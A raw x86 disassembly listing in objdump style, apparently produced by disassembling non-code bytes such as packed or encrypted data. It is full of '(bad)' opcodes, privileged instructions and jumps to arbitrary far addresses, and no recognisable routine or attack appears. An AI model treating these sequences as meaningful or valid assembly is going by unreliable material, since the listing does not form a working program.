  41ffa1:	jmp    0x47c1:0x6ee9ff33
  41ffa8:	int3   
  41ffa9:	gs pop ds
  41ffab:	jg     0x41ffd7
  41ffad:	sti    
  41ffae:	cmp    al,0x20
  41ffb0:	add    al,0x3c
  41ffb2:	sbb    DWORD PTR [ebp+edx*2+0xea1c328],ebp
  41ffb9:	fld    TBYTE PTR [esi]
  41ffbb:	cli    
  41ffbc:	arpl   WORD PTR [esi+0x6e1ee86],dx
  41ffc2:	fstp   DWORD PTR [edi-0x74]
  41ffc5:	pop    ecx
  41ffc6:	dec    ebx
  41ffc7:	add    al,0xe
  41ffc9:	js     0x41ffaf
  41ffcb:	jbe    0x41ffae
  41ffcd:	sub    ecx,ebx
  41ffcf:	mov    al,ds:0x2aa69a16
  41ffd4:	sub    DWORD PTR [ebp-0x57],ebp
  41ffd7:	test   edx,ebp
  41ffd9:	pop    ebp
  41ffda:	jne    0x420059
  41ffdc:	into   
  41ffdd:	popf   
  41ffde:	je     0x420045
  41ffe0:	mov    ebx,0xf0384cc8
  41ffe5:	clc    
  41ffe6:	add    eax,0x8c74cdc6
  41ffeb:	add    dl,BYTE PTR [ebp-0x7b]
  41ffee:	xchg   esp,eax
  41ffef:	cdq    
  41fff0:	fimul  DWORD PTR [ecx+0x3a719d86]
  41fff6:	fisub  DWORD PTR [eax]
  41fff8:	into   
  41fff9:	or     edx,DWORD PTR [edx]
  41fffb:	enter  0x109e,0xb2
  41ffff:	cmp    DWORD PTR [edx],0x9e71d455
  420005:	lods   al,BYTE PTR ds:[esi]
  420006:	les    esp,FWORD PTR [esi]
  420008:	xor    DWORD PTR [esp+eiz*2],ebp
  42000b:	jae    0x420049
  42000d:	mov    WORD PTR [ecx+0x75],fs
  420010:	mov    eax,DWORD PTR [eax-0x5b62ed16]
  420016:	enter  0x8304,0x2b
  42001a:	in     al,0x75
  42001c:	inc    edx
  42001d:	push   0x548067ac
  420022:	int3   
  420023:	cld    
  420024:	pusha  
  420025:	or     DWORD PTR [ebx+0x42],0xffffffef
  420029:	ror    BYTE PTR [eax],0xca
  42002c:	shl    BYTE PTR [edi],1
  42002e:	je     0x41ffef
  420030:	adc    al,0xbf
  420032:	add    BYTE PTR [eax],ch
  420034:	into   
  420035:	xchg   DWORD PTR [edx-0x4],ebx
  420038:	in     al,0xe3
  42003a:	mov    edi,0x324561bf
  42003f:	rol    ebx,1
  420041:	push   ss
  420042:	xchg   ebx,eax
  420043:	je     0x4200c3
  420045:	dec    esp
  420046:	ins    BYTE PTR es:[edi],dx
  420047:	lock push 0xffffffa1
  42004a:	popa   
  42004b:	adc    esp,DWORD PTR [edx+0x352793ba]
  420051:	std    
  420052:	cmp    bh,BYTE PTR [esi]
  420054:	xor    eax,DWORD PTR [ebp-0x52]
  420057:	mov    ch,al
  420059:	xchg   esp,eax
  42005a:	jo     0x420035
  42005c:	jmp    0x4200a4
  42005e:	loopne 0x42002d
  420060:	sub    edi,DWORD PTR [ebp-0x4f629e8a]
  420066:	jae    0x420022
  420068:	mov    al,ds:0xd6a9ba83
  42006d:	or     edx,DWORD PTR [edi+0x3f]
  420070:	ins    BYTE PTR es:[edi],dx
  420071:	xchg   edx,eax
  420072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420073:	xchg   esi,eax
  420074:	cmp    BYTE PTR [ebp+0x77],dl
  420077:	loope  0x420036
  420079:	aad    0x25
  42007b:	push   esi
  42007c:	rol    DWORD PTR [ecx],cl
  42007e:	pop    eax
  42007f:	dec    ecx
  420080:	imul   DWORD PTR [esi-0x22eafd55]
  420086:	fild   WORD PTR [ebx+edx*2]
  420089:	xor    al,0x79
  42008b:	jge    0x420082
  42008d:	cmp    esp,DWORD PTR [eax+0x28d9e700]
  420093:	or     cl,BYTE PTR ds:0x206770a1
  420099:	xor    BYTE PTR [edi],dh
  42009b:	or     DWORD PTR [eax+0x2d29b257],0xffffffe7
  4200a2:	ds ret 
  4200a4:	add    al,0x12
  4200a6:	mov    ecx,0xfeddf42d
  4200ab:	int3   
  4200ac:	cmp    DWORD PTR [esi],eax
  4200ae:	push   edx
  4200af:	ss adc al,0x3c
  4200b2:	mov    al,ds:0x35dcba1a
  4200b7:	aaa    
  4200b8:	shl    BYTE PTR [eax-0x41a7da79],0x6b
  4200bf:	(bad)  
  4200c0:	cmp    esi,edi
  4200c2:	in     al,dx
  4200c3:	inc    ebp
  4200c4:	sbb    edx,edi
  4200c6:	sbb    al,BYTE PTR [ebx+0x6a8d690f]
  4200cc:	sbb    ch,BYTE PTR [esi+esi*4+0x14]
  4200d0:	and    eax,0xdfc22b60
  4200d5:	sahf   
  4200d6:	ja     0x42006e
  4200d8:	jle    0x42006a
  4200da:	mov    esi,0x2c176b
  4200df:	and    eax,0x46361008
  4200e4:	(bad)
  4200e8:	outs   dx,BYTE PTR ds:[esi]
  4200e9:	jecxz  0x420138
  4200eb:	jno    0x4200c5
  4200ed:	idiv   ch
  4200ef:	push   0xeb67cb9b
  4200f4:	fistp  QWORD PTR [edx+eiz*8-0x4cb88a39]
  4200fb:	das    
  4200fc:	stc    
  4200fd:	shl    eax,cl
  4200ff:	cmp    eax,0x510bf39b
  420104:	cmp    ch,0xf8
  420107:	stc    
  420108:	xchg   ebp,eax
  420109:	stos   BYTE PTR es:[edi],al
  42010a:	pushf  
  42010b:	add    al,ah
  42010d:	add    DWORD PTR [eax+ebp*1+0x3],esi
  420111:	dec    eax
  420112:	xor    DWORD PTR [eax-0x52be0216],esi
  420118:	sub    bh,BYTE PTR [ebx+0x73988bac]
  42011e:	int    0x23
  420120:	jnp    0x42013c
  420122:	or     al,0xbd
  420124:	mov    ebp,0x56e53eb9
  420129:	aad    0xe6
  42012b:	or     ebx,ebx
  42012d:	adc    dh,ah
  42012f:	dec    eax
  420130:	xlat   BYTE PTR ds:[ebx]
  420131:	add    eax,0x7eff06c
  420136:	sti    
  420137:	mov    al,BYTE PTR [ebp-0x72641e51]
  42013d:	or     ebx,DWORD PTR [ecx]
  42013f:	inc    esi
  420140:	adc    bh,BYTE PTR [ecx+0x3f]
  420143:	sub    eax,0x382d2a64
  420148:	cmp    esp,DWORD PTR ds:0xaeb7aa19
  42014e:	and    DWORD PTR [esi+0x27784006],esp
  420154:	jbe    0x420166
  420156:	lods   eax,DWORD PTR ds:[esi]
  420157:	and    al,0xef
  420159:	lahf   
  42015a:	das    
  42015b:	lahf   
  42015c:	nop
  42015d:	cmp    bh,dl
  42015f:	ds loopne 0x420120
  420162:	add    BYTE PTR [esi],ch
  420164:	jae    0x42018f
  420166:	mov    cl,0x8a
  420168:	adc    eax,0xeaffc6dc
  42016d:	xchg   esi,eax
  42016e:	icebp  
  42016f:	mov    cl,0x1e
  420171:	pop    edx
  420172:	scas   eax,DWORD PTR es:[edi]
  420173:	in     al,dx
  420174:	mov    edx,edi
  420176:	push   es
  420177:	jl     0x42016e
  420179:	add    BYTE PTR [ebp+0x5382c547],ch
  42017f:	jg     0x42019f
  420181:	enter  0x568b,0x75
  420185:	or     ecx,DWORD PTR [esi]
  420187:	jne    0x420174
  420189:	pop    ebx
  42018a:	xor    eax,0x5fe8169
  42018f:	mov    dh,0x1d
  420191:	pop    esp
  420192:	jle    0x4201b3
  420194:	icebp  
  420195:	mov    eax,0xa615ec74
  42019a:	mov    bh,cl
  42019c:	jne    0x4201a0
  42019e:	mov    ch,0xea
  4201a0:	mov    edx,0xbadb4f1a
  4201a5:	push   0xffffff98
  4201a7:	sbb    ecx,DWORD PTR [edi+0x1ada9280]
  4201ad:	push   ebx
  4201ae:	test   WORD PTR [ebx+ecx*2+0x59],bp
  4201b3:	addr16 pusha 
  4201b5:	ja     0x420186
  4201b7:	inc    ebp
  4201b8:	lds    esi,FWORD PTR [ebx-0x3]
  4201bb:	getsec 
  4201bd:	mov    WORD PTR [esp+ebp*1],ds
  4201c0:	loopne 0x420215
  4201c2:	mov    DWORD PTR [edx+0x71cc77aa],ebx
  4201c8:	addr16 cmc 
  4201ca:	add    bh,BYTE PTR [edi+eiz*8]
  4201cd:	cmp    ebx,esp
  4201cf:	lea    ebp,[edx+eiz*1]
  4201d2:	lea    eax,[edi+0x55b2faa9]
  4201d8:	inc    eax
  4201d9:	add    ebx,DWORD PTR [eax]
  4201db:	inc    eax
  4201dc:	inc    eax
  4201dd:	ror    esi,cl
  4201df:	ins    BYTE PTR es:[edi],dx
  4201e0:	mov    ds:0xb6b6f0ac,al
  4201e5:	scas   eax,DWORD PTR es:[edi]
  4201e6:	lods   eax,DWORD PTR ds:[esi]
  4201e7:	and    al,0x3b
  4201e9:	xor    DWORD PTR [edx],ebx
  4201eb:	retf   0xc19f
  4201ee:	test   DWORD PTR [ebx-0x52fa0a28],esp
  4201f4:	call   0xc1a95525
  4201f9:	mov    al,0xb3
  4201fb:	fldenv gs:[edx+ecx*2]
  4201ff:	pop    edx
  420200:	jae    0x420254
  420202:	and    eax,DWORD PTR ds:0xb5a55471
  420208:	stos   DWORD PTR es:[edi],eax
  420209:	pop    ss
  42020a:	or     ebx,edi
  42020c:	dec    edi
  42020d:	mov    eax,0xad3f38a0
  420212:	sub    edx,DWORD PTR [edi]
  420214:	inc    eax
  420215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420216:	xor    eax,0x8f16a620
  42021b:	mov    bh,0xbc
  42021d:	add    BYTE PTR [ecx+0x2a],ah
  420220:	adc    edi,DWORD PTR [eax-0x58d7ce3b]
  420226:	push   cs
  420227:	mov    ebx,0x6a514b85
  42022c:	sbb    edi,DWORD PTR [ebp+0x5857637f]
  420232:	test   eax,0x33a69a6a
  420237:	pushf  
  420238:	add    DWORD PTR [eax],ebx
  42023a:	xchg   esp,eax
  42023b:	and    cl,BYTE PTR [edx]
  42023d:	fiadd  DWORD PTR [ebx-0x1f]
  420240:	adc    eax,0x750d5ba8
  420245:	test   al,0xde
  420247:	sbb    esi,ecx
  420249:	retf   0xd9c9
  42024c:	sbb    eax,0x39005efd
  420251:	cmp    DWORD PTR [esi+0x7ba59cd0],0xf35278b5
  42025b:	aad    0x11
  42025d:	loop   0x420263
  42025f:	out    0x1f,eax
  420261:	imul   ebp,eax,0x43ff88c9
  420267:	mov    BYTE PTR [edx],dh
  420269:	call   0x5751:0xbdc55e62
  420270:	in     eax,0x5b
  420272:	sbb    cl,BYTE PTR [ebp+0x51]
  420275:	test   al,0xe2
  420277:	lahf   
  420278:	fwait
  420279:	inc    edx
  42027a:	jnp    0x42020c
  42027c:	xchg   esi,eax
  42027d:	jb     0x4202b1
  42027f:	test   al,0xbe
  420281:	cmp    DWORD PTR [ebp-0x1eba944c],0x10e8dcff
  42028b:	mov    dh,0x4e
  42028d:	mov    ebx,0xec737401
  420292:	and    bl,BYTE PTR [edi-0x22]
  420295:	mov    al,ds:0x2a11b194
  42029a:	daa    
  42029b:	add    DWORD PTR [edx],edi
  42029d:	xor    eax,0x1e1145d6
  4202a2:	adc    ah,BYTE PTR [edx-0x89e5e88]
  4202a8:	or     BYTE PTR [ebx-0xc],bh
  4202ab:	inc    esp
  4202ac:	ds ret 0x5f99
  4202b0:	push   ds
  4202b1:	mov    esi,0xcbe6acb4
  4202b6:	(bad)  
  4202b7:	mov    ebx,0x2be0315f
  4202bc:	mov    eax,ds:0x9bbca358
  4202c1:	leave  
  4202c2:	jbe    0x42033f
  4202c4:	push   edx
  4202c5:	push   ebp
  4202c6:	std    
  4202c7:	dec    edi
  4202c8:	(bad)  
  4202c9:	shl    BYTE PTR [eax+0x47],cl
  4202cc:	xlat   BYTE PTR ds:[ebx]
  4202cd:	sbb    DWORD PTR [ecx+0x2b744926],edi
  4202d3:	jnp    0x420305
  4202d5:	mov    al,0xf1
  4202d7:	mov    bh,0xb8
  4202d9:	ret    
  4202da:	gs adc eax,0x741f1e1b
  4202e0:	push   esp
  4202e1:	mov    eax,0x20e93e
  4202e6:	xor    eax,0x3a662592
  4202eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ec:	and    cl,dh
  4202ee:	or     eax,0xf2fcac1a
  4202f3:	aaa    
  4202f4:	icebp  
  4202f5:	hlt    
  4202f6:	xor    al,0x29
  4202f8:	xchg   edi,eax
  4202f9:	lods   eax,DWORD PTR ds:[esi]
  4202fa:	cmp    eax,0x12b92a1e
  4202ff:	loope  0x42028b
  420301:	int    0x89
  420303:	sbb    eax,0xb39ed943
  420308:	push   edx
  420309:	jb     0x4202df
  42030b:	inc    ebx
  42030c:	mov    bh,0xd6
  42030e:	add    esp,DWORD PTR [edi+ecx*1]
  420311:	push   0xffffffee
  420313:	pop    DWORD PTR [edi-0x237e9fb6]
  420319:	in     al,dx
  42031a:	cdq    
  42031b:	repz aad 0xca
  42031e:	jl     0x4202dc
  420320:	inc    esi
  420321:	jno    0x4202a4
  420323:	adc    DWORD PTR [ecx-0x29],edi
  420326:	fisttp QWORD PTR [ebx]
  420328:	or     eax,0x92220854
  42032d:	adc    edi,DWORD PTR [ebx-0x1e]
  420330:	push   ss
  420331:	sahf   
  420332:	pop    ecx
  420333:	mov    ecx,0xec101da5
  420338:	mov    bh,0x77
  42033a:	loope  0x4203b4
  42033c:	add    ch,BYTE PTR [ecx+0x2f]
  42033f:	sbb    eax,0x8b1349e4
  420344:	dec    edx
  420345:	mov    edi,0xff7bc9cf
  42034a:	xchg   edx,eax
  42034b:	js     0x420375
  42034d:	call   0x5de092be
  420352:	push   ds
  420353:	sti    
  420354:	push   es
  420355:	(bad)  
  420356:	xor    esp,edi
  420358:	mov    ebp,0x7672276a
  42035d:	dec    ebx
  42035e:	mov    DWORD PTR [ebx+edi*8-0x79b535b5],edx
  420365:	enter  0x50bc,0x63
  420369:	clc    
  42036a:	xchg   bl,bh
  42036c:	pop    esi
  42036d:	and    al,0x13
  42036f:	mov    al,0x9b
  420371:	jnp    0x420337
  420373:	cmovnp edi,DWORD PTR [edx-0x6d8dde8c]
  42037a:	dec    ecx
  42037b:	sub    ebp,DWORD PTR ss:[esi+edx*4]
  42037f:	ss pop esi
  420381:	mov    dh,0x92
  420383:	push   esi
  420384:	pop    edi
  420385:	xchg   ebx,eax
  420386:	stos   BYTE PTR es:[edi],al
  420387:	dec    esp
  420388:	lock mov bl,0xa5
  42038b:	mov    ss:0x8597470b,al
  420391:	xchg   ecx,eax
  420392:	push   ebp
  420393:	sbb    ch,BYTE PTR [eax-0x64]
  420396:	cmp    DWORD PTR [ebp-0x54],edi
  420399:	ret    
  42039a:	mov    ds:0x4fb3dc38,eax
  42039f:	jmp    0x240d7e6f
  4203a4:	lods   al,BYTE PTR ds:[esi]
  4203a5:	fstp   TBYTE PTR [edx+0x6373036c]
  4203ab:	in     al,dx
  4203ac:	pop    ebx
  4203ad:	push   ebp
  4203ae:	sub    ah,BYTE PTR [eax+0x3080a31a]
  4203b4:	cmp    DWORD PTR [di],edx
  4203b7:	das    
  4203b8:	or     DWORD PTR ds:0x4ba56156,esi
  4203be:	sbb    bh,ah
  4203c0:	dec    ecx
  4203c1:	aad    0xf9
  4203c3:	repz cmp cl,ch
  4203c6:	(bad)  [ebx+0x35]
  4203c9:	add    ch,bl
  4203cb:	cmp    al,0xc4
  4203cd:	xchg   BYTE PTR [esi-0x5e75f948],cl
  4203d3:	inc    esi
  4203d4:	xor    BYTE PTR [edi-0x3b],al
  4203d7:	add    eax,0x24d52471
  4203dc:	outs   dx,BYTE PTR ds:[esi]
  4203dd:	xchg   edi,eax
  4203de:	xor    al,0x23
  4203e0:	mul    esi
  4203e2:	inc    eax
  4203e3:	xchg   esp,eax
  4203e4:	ins    DWORD PTR es:[edi],dx
  4203e5:	ret    
  4203e6:	sahf   
  4203e7:	bsf    esp,DWORD PTR [ebx]
  4203ea:	xor    eax,0x6b8ffc23
  4203ef:	mov    ebx,0xd0ae2e39
  4203f4:	push   0xffffffa4
  4203f6:	es sbb edi,edi
  4203f9:	cmp    eax,ecx
  4203fb:	leave  
  4203fc:	mov    edx,0xb382f92d
  420401:	adc    DWORD PTR ds:0x6b1fe036,ebx
  420407:	nop
  420408:	cmp    BYTE PTR [eax-0x6521eb0e],al
  42040e:	and    DWORD PTR [esi+0x2],ecx
  420411:	jmp    0xae35:0x1d80d416
  420418:	xchg   edx,eax
  420419:	sbb    DWORD PTR [esi],0x1c
  42041c:	sub    DWORD PTR [ebp-0x42],edx
  42041f:	sub    esi,esp
  420421:	int    0x7d
  420423:	lea    ebx,[esi+esi*1-0x1d0cf77c]
  42042a:	stos   DWORD PTR es:[edi],eax
  42042b:	pop    ds
  42042c:	loopne 0x42040e
  42042e:	pop    esi
  42042f:	jmp    0xf09e9f2c
  420434:	cmp    ah,dl
  420436:	add    BYTE PTR [edx],cl
  420438:	xchg   esp,eax
  420439:	inc    esi
  42043a:	js     0x420482
  42043c:	cmp    eax,0xc6f09a54
  420441:	adc    dh,BYTE PTR [edx-0x4cfe5e35]
  420447:	fstp   DWORD PTR ds:0xcb5c1555
  42044d:	jo     0x420422
  42044f:	fs out 0xd0,eax
  420452:	pop    es
  420453:	jbe    0x4203ef
  420455:	inc    ecx
  420456:	or     BYTE PTR [eax+0xb],0x6d
  42045a:	push   0x8dc2b28f
  42045f:	test   al,0x9a
  420461:	or     ebp,eax
  420463:	push   esi
  420464:	cmp    bh,BYTE PTR [eax-0x77]
  420467:	pop    eax
  420468:	push   ebx
  420469:	xor    BYTE PTR [eax+0x6e],ch
  42046c:	sub    ecx,ebp
  42046e:	cdq    
  42046f:	push   cs
  420470:	jle    0x4204bc
  420472:	jo     0x4204e2
  420474:	imul   DWORD PTR [ebp+edi*2+0xdfd5c2c]
  42047b:	pop    edx
  42047c:	xor    BYTE PTR [eax+edi*2+0x72cec88f],0xb8
  420484:	retf   
  420485:	mov    bl,0x44
  420487:	enter  0x2b25,0x8b
  42048b:	mov    eax,ds:0xdfc9667f
  420490:	cli    
  420491:	xor    al,0x0
  420493:	out    dx,al
  420494:	jnp    0x4204cd
  420496:	add    al,0x93
  420498:	jmp    0xa301:0x39ae08fe
  42049f:	out    dx,eax
  4204a0:	jb     0x4204f2
  4204a2:	nop
  4204a3:	inc    esp
  4204a4:	mov    eax,0x3bd633f6
  4204a9:	nop
  4204aa:	repnz pop esi
  4204ac:	xchg   edx,eax
  4204ad:	and    al,BYTE PTR [eax]
  4204af:	inc    esi
  4204b0:	iret   
  4204b1:	icebp  
  4204b2:	jae    0x42051c
  4204b4:	and    al,0x36
  4204b6:	ror    BYTE PTR gs:[ecx+0x4abb37a4],1
  4204bd:	lahf   
  4204be:	sub    ecx,DWORD PTR [ecx]
  4204c0:	in     eax,0xce
  4204c2:	aad    0x78
  4204c4:	scas   eax,DWORD PTR es:[edi]
  4204c5:	sar    DWORD PTR [ecx+0x6f],cl
  4204c8:	and    DWORD PTR [edx],ebx
  4204ca:	push   edi
  4204cb:	jecxz  0x420452
  4204cd:	icebp  
  4204ce:	ror    BYTE PTR [edi-0x29],1
  4204d1:	outs   dx,BYTE PTR ds:[esi]
  4204d2:	icebp  
  4204d3:	sub    BYTE PTR [edi+0x278677b1],dl
  4204d9:	jno    0x42047c
  4204db:	retf   
  4204dc:	xchg   edi,eax
  4204dd:	adc    esp,DWORD PTR [esi+0x615b7656]
  4204e3:	sub    esp,DWORD PTR [esp+ebx*4-0x1e]
  4204e7:	jae    0x4204b3
  4204e9:	aam    0x83
  4204eb:	pop    ebp
  4204ec:	ret    
  4204ed:	sahf   
  4204ee:	mov    al,ds:0x6922e69a
  4204f3:	mov    DWORD PTR [esi-0x3d1f44e3],eax
  4204f9:	push   esi
  4204fa:	retf   0x2f7d
  4204fd:	sbb    BYTE PTR [ebx-0xc],ah
  420500:	mov    ch,0x7c
  420502:	pop    esi
  420503:	xor    eax,0x5264ba4b
  420508:	arpl   di,di
  42050a:	xchg   ebp,eax
  42050b:	adc    edi,eax
  42050d:	dec    ecx
  42050e:	in     eax,dx
  42050f:	pusha  
  420510:	cmc    
  420511:	loopne 0x42057f
  420513:	mov    cl,0x1d
  420515:	les    eax,FWORD PTR [esi-0xd]
  420518:	es dec ebp
  42051a:	aas    
  42051b:	xchg   esp,eax
  42051c:	lods   eax,DWORD PTR ds:[esi]
  42051d:	shl    DWORD PTR [esi+0x27],cl
  420520:	jmp    0x2d30f1d4
  420525:	fld1   
  420527:	in     al,dx
  420528:	xor    DWORD PTR [ebp-0x71],edx
  42052b:	mov    ebx,0x7e5d99b5
  420530:	and    BYTE PTR [ebx-0x257a00a8],dl
  420536:	pop    ds
  420537:	fdiv   QWORD PTR [ecx]
  420539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053a:	xchg   esi,eax
  42053b:	nop
  42053c:	imul   esp,DWORD PTR [edi-0x17153917],0x1f
  420543:	or     eax,0x3cd0aa4d
  420548:	cld    
  420549:	push   ebp
  42054a:	hlt    
  42054b:	addr16 sbb eax,0xcc2e1734
  420551:	sub    edx,ecx
  420553:	(bad)  
  420554:	cmp    al,0xae
  420556:	xor    BYTE PTR [ebx],ah
  420558:	stos   DWORD PTR es:[edi],eax
  420559:	jle    0x4205bc
  42055b:	add    al,0x55
  42055d:	fadd   DWORD PTR [ecx]
  42055f:	push   0xffffff8e
  420561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420562:	test   eax,0x8ea8e7b6
  420567:	int3   
  420568:	mov    esi,0xbe1d2039
  42056d:	loope  0x4204f2
  42056f:	sar    BYTE PTR [esp+ecx*8-0x73],0xa8
  420574:	xchg   DWORD PTR [edx-0x6a],ecx
  420577:	and    bh,BYTE PTR [ebx]
  420579:	push   cs
  42057a:	sahf   
  42057b:	and    DWORD PTR [eax+0x66018d44],esi
  420581:	sbb    DWORD PTR [si+0x65],0x3fbe414c
  420589:	fs xchg edi,eax
  42058b:	sbb    dl,bl
  42058d:	or     BYTE PTR [edx-0x7d],ch
  420590:	gs push eax
  420592:	cmp    DWORD PTR [ebx],ebp
  420594:	fadd   DWORD PTR [edi]
  420596:	push   cs
  420597:	scas   al,BYTE PTR es:[edi]
  420598:	inc    esp
  420599:	ret    
  42059a:	mov    DWORD PTR [esi],ecx
  42059c:	fistp  WORD PTR [edi-0x5e]
  42059f:	(bad)  
  4205a0:	int    0x85
  4205a2:	push   eax
  4205a3:	xchg   DWORD PTR [edx+0x5439e4b2],edi
  4205a9:	cld    
  4205aa:	pop    esi
  4205ab:	adc    cl,BYTE PTR [edx+0x26]
  4205ae:	jns    0x420567
  4205b0:	(bad)  
  4205b1:	test   dh,dh
  4205b3:	imul   ecx,DWORD PTR [edi-0x73],0xffffffb9
  4205b7:	sbb    eax,eax
  4205b9:	mov    al,0x22
  4205bb:	sti    
  4205bc:	leave  
  4205bd:	push   ecx
  4205be:	pop    ecx
  4205bf:	jne    0x420622
  4205c1:	xchg   ebp,edx
  4205c3:	int    0xc5
  4205c5:	xlat   BYTE PTR ds:[ebx]
  4205c6:	lock push eax
  4205c8:	pop    edi
  4205c9:	lods   al,BYTE PTR ds:[esi]
  4205ca:	jo     0x420611
  4205cc:	loopne 0x420593
  4205ce:	fidiv  WORD PTR [edi]
  4205d0:	xchg   BYTE PTR [ebx-0x3a2aefcb],dh
  4205d6:	cwde   
  4205d7:	pop    edi
  4205d8:	mov    ah,0x5f
  4205da:	push   eax
  4205db:	sbb    eax,0x55bb3176
  4205e0:	aam    0xe7
  4205e2:	dec    esi
  4205e3:	pop    edi
  4205e4:	in     al,dx
  4205e5:	add    BYTE PTR [ecx-0x6607e95b],al
  4205eb:	add    al,0x1
  4205ed:	mov    eax,ds:0x20b18a98
  4205f2:	je     0x420581
  4205f4:	jnp    0x4205d5
  4205f6:	mov    dl,al
  4205f8:	cs dec edi
  4205fa:	(bad)  
  4205fc:	icebp  
  4205fd:	inc    ebx
  4205fe:	(bad)  
  4205ff:	das    
  420600:	mov    eax,ds:0x7362bcd0
  420605:	fcomp  QWORD PTR [eax]
  420607:	cmp    eax,0x910c0788
  42060c:	mov    al,0xf6
  42060e:	adc    ebx,DWORD PTR [edx+eax*8-0x5ae0e82b]
  420615:	neg    DWORD PTR [ecx]
  420617:	pusha  
  420618:	fistp  DWORD PTR [eax+0x24]
  42061b:	popa   
  42061c:	pop    edi
  42061d:	lds    ebp,FWORD PTR [eax-0x52]
  420620:	lahf   
  420621:	push   es
  420622:	imul   edx,DWORD PTR [esi+0x2f71e512],0xffffff97
  420629:	(bad)  
  42062a:	fistp  WORD PTR [eax-0x12]
  42062d:	data16 xor al,0xfe
  420630:	shl    ebp,0x27
  420633:	pop    es
  420634:	mov    eax,ds:0x85e4a2f2
  420639:	adc    al,0xcf
  42063b:	mov    ecx,0x1148bbf3
  420640:	push   0xffffffc6
  420642:	and    al,0x94
  420644:	jle    0x4206b3
  420646:	dec    eax
  420647:	adc    al,0x4c
  420649:	or     eax,DWORD PTR [edi+0x1227af5d]
  42064f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420650:	pop    esp
  420651:	add    BYTE PTR [ebx],bh
  420653:	push   ss
  420654:	call   0x8610:0xaad02a60
  42065b:	sub    ah,cl
  42065d:	mov    bl,BYTE PTR [ecx+0x20]
  420660:	ja     0x4206dc
  420662:	adc    eax,0x6b
  420665:	push   ebx
  420666:	pop    ds
  420667:	sbb    eax,0xb54027b5
  42066c:	std    
  42066d:	adc    esi,ebp
  42066f:	imul   edi,DWORD PTR [ecx],0x43
  420672:	imul   ebp,ebx,0x9f14252a
  420678:	xor    cl,ch
  42067a:	mov    eax,ds:0xb1e63cf3
  42067f:	xor    ecx,DWORD PTR [eax]
  420681:	gs pop ebp
  420683:	lea    edx,[edx]
  420685:	jmp    0x2407:0x8838c870
  42068c:	jle    0x420671
  42068e:	sub    BYTE PTR [eax+0x76],dl
  420691:	mov    edi,0x205074fe
  420696:	mov    ch,0x74
  420698:	mov    dl,0x91
  42069a:	adc    al,0x2a
  42069c:	test   DWORD PTR [ebp-0x6a4a1f85],edi
  4206a2:	pop    ebx
  4206a3:	cmp    edi,0x6335e9f0
  4206a9:	sbb    eax,0x8ec15a07
  4206ae:	fwait
  4206af:	nop
  4206b0:	jecxz  0x420721
  4206b2:	inc    ebp
  4206b3:	xor    eax,0xbf9df9a2
  4206b8:	in     eax,0xe5
  4206ba:	test   al,0x6
  4206bc:	add    ebx,DWORD PTR [ecx-0x58ecab1e]
  4206c2:	cdq    
  4206c3:	push   esp
  4206c4:	sbb    esi,DWORD PTR [esi-0x76]
  4206c7:	pop    edi
  4206c8:	sub    al,BYTE PTR [ecx]
  4206ca:	rol    DWORD PTR [ebx-0x57315b87],cl
  4206d0:	jo     0x42068f
  4206d2:	sbb    DWORD PTR [ecx+eiz*8+0x38],ebx
  4206d6:	ss aam 0x36
  4206d9:	mov    edi,0x2b3f4395
  4206de:	fld    DWORD PTR [ecx+0x1]
  4206e1:	enter  0xcb26,0x7b
  4206e5:	mov    dh,0xe6
  4206e7:	mov    bh,0x8
  4206e9:	and    edi,DWORD PTR [ebx]
  4206eb:	add    ch,BYTE PTR [esp+edx*2]
  4206ee:	aas    
  4206ef:	jb     0x420735
  4206f1:	aam    0xb2
  4206f3:	nop
  4206f4:	gs jns 0x4206f7
  4206f7:	xchg   esi,eax
  4206f8:	mov    esi,0xf63144a6
  4206fd:	loop   0x42075e
  4206ff:	fnstsw WORD PTR [ebx+0x2b]
  420702:	mov    ah,0xfb
  420704:	ins    DWORD PTR es:[edi],dx
  420705:	loope  0x420696
  420707:	loopne 0x420727
  420709:	sub    BYTE PTR [esi-0x1c],bl
  42070c:	imul   edi,DWORD PTR [ebp-0x35685770],0x450b82fb
  420716:	inc    eax
  420717:	aas    
  420718:	and    BYTE PTR [edx],ch
  42071a:	dec    ebx
  42071b:	lods   eax,DWORD PTR ds:[esi]
  42071c:	call   0xdc06da91
  420721:	cmc    
  420722:	mov    ds:0x29a30ac,eax
  420727:	dec    ebx
  420728:	ror    BYTE PTR [ecx],0x76
  42072b:	push   ds
  42072c:	ret    
  42072d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42072e:	xchg   BYTE PTR [edi],bl
  420730:	pop    ebx
  420731:	mov    WORD PTR ss:[ecx+0x12],fs
  420735:	adc    esi,DWORD PTR [esi+0x2f3855e1]
  42073b:	push   es
  42073c:	bswap  esi
  42073e:	mov    edi,0x2fd04d3c
  420743:	aad    0x7c
  420745:	mov    dh,0xcb
  420747:	ja     0x4206fc
  420749:	cdq    
  42074a:	pop    esp
  42074b:	mov    ecx,0x5daf7637
  420750:	neg    DWORD PTR [ebx-0x25]
  420753:	mov    WORD PTR [edx+0x613f4f22],cs
  420759:	das    
  42075a:	mov    DWORD PTR [edx+0x7a],ebx
  42075d:	or     al,0x63
  42075f:	sar    ecx,1
  420761:	lock cmp edx,edx
  420764:	or     esi,DWORD PTR [ebx+0x1]
  420767:	scas   eax,DWORD PTR es:[edi]
  420768:	fs xor dl,bl
  42076b:	in     eax,dx
  42076c:	test   eax,0xb0e9e943
  420771:	dec    esi
  420772:	(bad)  
  420773:	jmp    0xa7a9:0x1ddfe369
  42077a:	mov    ecx,0xf29d4e6c
  42077f:	jmp    0xc5206962
  420784:	jns    0x420795
  420786:	ffreep st(2)
  420788:	jbe    0x42074a
  42078a:	xor    ecx,DWORD PTR [ecx-0x6f]
  42078d:	xchg   ecx,eax
  42078e:	xchg   esi,eax
  42078f:	pop    esp
  420790:	sahf   
  420791:	sub    al,0xfe
  420793:	aas    
  420794:	(bad)  
  420795:	aam    0x3
  420797:	and    eax,0xf1e83e3c
  42079c:	stos   BYTE PTR es:[edi],al
  42079d:	call   0x30b7ce5b
  4207a2:	into   
  4207a3:	leave  
  4207a4:	shl    DWORD PTR [eax-0x4d],0xfd
  4207a8:	sub    eax,DWORD PTR [edx-0x182dd801]
